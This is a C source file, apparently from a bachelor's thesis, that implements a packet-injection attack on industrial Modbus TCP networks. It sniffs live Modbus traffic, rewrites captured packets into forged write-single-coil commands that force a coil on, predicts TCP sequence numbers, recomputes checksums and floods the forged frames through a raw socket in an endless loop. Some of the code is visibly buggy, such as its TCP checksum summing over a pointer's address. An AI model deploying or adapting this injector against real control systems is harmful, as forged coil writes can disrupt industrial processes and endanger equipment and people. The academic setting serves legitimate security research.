// Solution for BACHELOR’S THESIS: atack generation on industrial modbus network
// File:        inject.c
// Author:      Jakub Kuzník, FIT
// Program will ... 

#include "inject.h"


int main(void){

  // Modbus TCP packet
  modbusPacket * mPacket;
  char * packetRawForm;
  // raw sockete for sending packets
  int rawSocket;  
  pcap_t * sniffInterface = NULL;
  char error_message[PCAP_ERRBUF_SIZE];

  srand(time(NULL)); // rand nums init.

  // this function will create raw socket.
  // if there is an error it will exit() program 
  rawSocket = createRawSocket();

  // open interface for sniffing // exit program if error 
  // global variable in sniff.c
  sniffInterface = openInt(error_message, OUT_INTERFACE);

  // find packet and parse all its info
  // TODO can send every nth (slow it down)
  while (1){
    mPacket = findModbusPacket();

    // generate malicious packet (predict seq, ack nums) from existing 
    generateMaliciousPacket(mPacket);

    int packet_size = ETH_HEADER_SIZE + IP_HEADER_SIZE
    + TCP_HEADER_SIZE + MODBUS_HEADER_SIZE + (ntohs(mPacket->modbusH.lenght) -1);
    
    // prepare packet to send
    packetRawForm = packetToCharArray(packet_size, mPacket);

    // count the crc 
    uint32_t crc = crc32(0L, Z_NULL, 0); // initialize CRC value
    crc = crc32(crc, (const Bytef *)packetRawForm, packet_size);
    printf("CRC: %u\n",crc);
  
    // Append the CRC to the packet data
    memcpy(packetRawForm + packet_size, &crc, sizeof(crc));
    packet_size += sizeof(crc);

    printf("len: %d\n",packet_size);
    //// debug packet raw data 
    for (int i = 0; i < packet_size; i++){
      printf(" %02hhX", packetRawForm[i]);
    }
    printf("\n");

    // send the data over the raw socket
    write(rawSocket, packetRawForm, packet_size);
    printf(".");
    free(packetRawForm);
    free(mPacket->modbusP.data);
    free(mPacket);
  }

  // close sniffing interface 
  pcap_close(sniffInterface);
  return 0;

}

/**
 * @brief Create malicious packet from existing. 
 */
void generateMaliciousPacket(modbusPacket *mPacket){

  // ref number -> 3 
  // activate -> data -> FF  
  // ack = ack + 48 == 4 write_single_coil packets
  // seq = seq + 48 == 4 write_single_coil packets
  
  // transaction id has to be unique 
  mPacket->modbusH.transactionId += rand();

  // ref num 3
  mPacket->modbusP.data[0] = 0;
  mPacket->modbusP.data[1] = 3;
  //mPacket->modbusP.data[1] = rand() % 4;

  // activate data
  mPacket->modbusP.data[2] = 0xff;
  //if (rand() % 2 == 0)
    //mPacket->modbusP.data[2] = 0xff;
  //else
    //mPacket->modbusP.data[2] = 0x00;


  mPacket->ipHeader.id = random();
  countIpChecksum(mPacket);
  countTcpChecksum(mPacket);
  //mPacket->ipHeader.check = 0;

  mPacket->tcpHeader.seq = htonl(ntohl(mPacket->tcpHeader.seq) + 48);
  mPacket->tcpHeader.ack_seq = htonl(ntohl(mPacket->tcpHeader.ack_seq) + 48);

}

/**
 * @brief count ip checksum for given packet 
 */
void countIpChecksum(modbusPacket * mPacket){
  
  // checksum field is nout counted 
  mPacket->ipHeader.check = 0; 

  uint32_t result = 0; 

  // inicialization of 16 bit value to ipHeader begining   
  const uint16_t *buf = (const uint16_t *) &mPacket->ipHeader;
  // iterate throught ip header (+16bit one iteration)
  for (int i = 0; i < IP_HEADER_SIZE/2; i++) { 
    result += buf[i];
  }
    
  // Add carry bits to sum
  // while there are some positive bits in upper 16bits 
  // sum the upper part to the lower part 
  while (result >> 16) {
    result = (result & 0xFFFF) + (result >> 16);
  }

  // complement == negate all bits 
  mPacket->ipHeader.check = (uint16_t) ~result;
}

/**
 * @brief count tcp checksum for given packet 
 */
void countTcpChecksum(modbusPacket * mPacket){
  uint32_t result = 0;

  // ip pseudo header fields that are used to count tcp checksum
  pseudoHeader ph = {
    .srcAddr  = mPacket->ipHeader.saddr,
    .dstAddr  = mPacket->ipHeader.daddr,
    .zero     = 0,
    .protocol = mPacket->ipHeader.protocol,
    .tcpLen   = htons(TCP_HEADER_SIZE 
                + ntohs(mPacket->ipHeader.tot_len) 
                - IP_HEADER_SIZE)
  };
  
  mPacket->tcpHeader.check = 0;  
  
  uint16_t tcpLength = ntohs(mPacket->ipHeader.tot_len) - IP_HEADER_SIZE;
  uint16_t payloadSize = tcpLength - TCP_HEADER_SIZE;

  
  // pseudo Header Tcp Header payload 
  unsigned char * phHP = malloc(PH_SIZE + TCP_HEADER_SIZE + IP_HEADER_SIZE);
  if (phHP == NULL){
    fprintf(stderr, "Malloc failed");
    exit(1);
  }

  // copy ph, tcpHeader and tcpPayload to phHP 
  char *pt = &phHP[0]; // pointer to first element of array

  // pseudo header  
  memcpy(pt, &ph, PH_SIZE);
  pt += PH_SIZE;
  
  // tcp header  
  memcpy(pt, &mPacket->tcpHeader, TCP_HEADER_SIZE);
  pt += TCP_HEADER_SIZE;
  
  // tcp payload   
  // Modbus TCP header
  memcpy(pt, &mPacket->modbusH, MODBUS_HEADER_SIZE);
  pt += MODBUS_HEADER_SIZE;
  // Modbus payload
  memcpy(pt, &mPacket->modbusP, 1); // function code 
  pt += 1;
  memcpy(pt, &mPacket->modbusP.data[0], ntohs(mPacket->modbusH.lenght) -2);
  
  // inicialization of 16 bit value to tcpHeader begining   
  const uint16_t *buf = (const uint16_t *) &phHP;
  
  // iterate throught ip header (+16bit one iteration)
  for (int i = 0; i < tcpLength/2; i++) { 
    result += buf[i];
  }
    
  // Add carry bits to sum
  // while there are some positive bits in upper 16bits 
  // sum the upper part to the lower part 
  while (result >> 16) {
    result = (result & 0xFFFF) + (result >> 16);
  }

  // complement == negate all bits 
  mPacket->tcpHeader.check= (uint16_t) ~result;


  // Set the TCP checksum field in the packet header
  //mPacket->tcpHeader.check = tcpChecksum;

  free(phHP);
}

/**
 * @brief count CRC checksum for given frame 
 */
uint32_t countCRC(modbusPacket * mPacket){
  return 0;
}

/**
 * @brief Set the Raw Socket object
 * @return socket or exit program  
 */
int createRawSocket(){

  int rawSocket = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
  if (rawSocket < 0){
    fprintf(stderr, "Error can't create raw socket\n");
    exit(1);
  }

  // get index of network interface named "eno2"
  int ifIndex = if_nametoindex(OUT_INTERFACE);
  if (ifIndex == 0) {
    fprintf(stderr, "Can't get network interface index");
    exit(1);
  }

  // bind socket to network interface
  struct sockaddr_ll sa;
  memset(&sa, 0, sizeof(sa));
  sa.sll_family = AF_PACKET;
  sa.sll_protocol = htons(ETH_P_ALL);
  sa.sll_ifindex = ifIndex; 
  if (bind(rawSocket, (struct sockaddr*)&sa, sizeof(sa)) < 0) {
    fprintf(stderr, "Can't bind socket to interface");
    exit(1);
  }

  return rawSocket;
}
